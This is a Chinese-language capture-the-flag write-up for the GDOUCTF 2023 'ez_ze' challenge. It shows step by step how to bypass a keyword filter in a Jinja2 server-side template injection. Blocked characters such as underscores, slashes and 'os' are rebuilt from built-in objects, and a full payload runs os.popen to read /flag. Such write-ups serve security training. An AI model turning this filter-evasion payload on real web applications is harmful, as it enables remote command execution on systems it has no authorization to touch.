#SSTI

[[GDOUCTF 2023]ez_ze - bl0ck - 博客园 (cnblogs.com)](https://www.cnblogs.com/bl0ck/articles/17595237.html)

被过滤：`{{` `}}` `popen` `_` `[` `]` `os` `getitem` `.` `"`
按照链接里的解法

payload 原型

```python
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}
```

先获取下划线和空格

```python
{% print(lipsum|string|list) %}
```

第十九个是下划线,这里要用 pop 来获取下划线。

```python
{% set pop=dict(pop=1)|join %}
{% set xhx=(lipsum|string|list)|attr(pop)(18) %}
{% set kong=(lipsum|string|list)|attr(pop)(9) %}
```

获取反斜线，**lipsum**里面没有斜杠，在**config**里面发现有斜杠有点多可以写可脚本遍历一下

第 239 个是斜杠

```python
{% set pop=dict(pop=1)|join %}
{% set re=(config|string|list)|attr(pop)(239) %}
```

然后是获取 `__globals__`

```python
{% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %}
```

用同样的方式获取 `__getitem__`

```python
{% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %}
```

其他的就是依葫芦画瓢。

完整的 payload 就是

```python
{% set pop=dict(pop=1)|join %}
{% set kong=(lipsum|string|list)|attr(pop)(9) %}
{% set xhx=(lipsum|string|list)|attr(pop)(18) %}
{% set re=(config|string|list)|attr(pop)(239) %}
{% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %}
{% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %}
{% set o=dict(o=a,s=b)|join %}
{% set po=dict(pop=a,en=b)|join %}
{% set cmd=(dict(cat=a)|join,kong,re,dict(flag=a)|join)|join %}
{% set read=dict(read=a)|join %}
{% print(lipsum|attr(globals)|attr(geti)(o)|attr(po)(cmd)|attr(read)()) %}
```
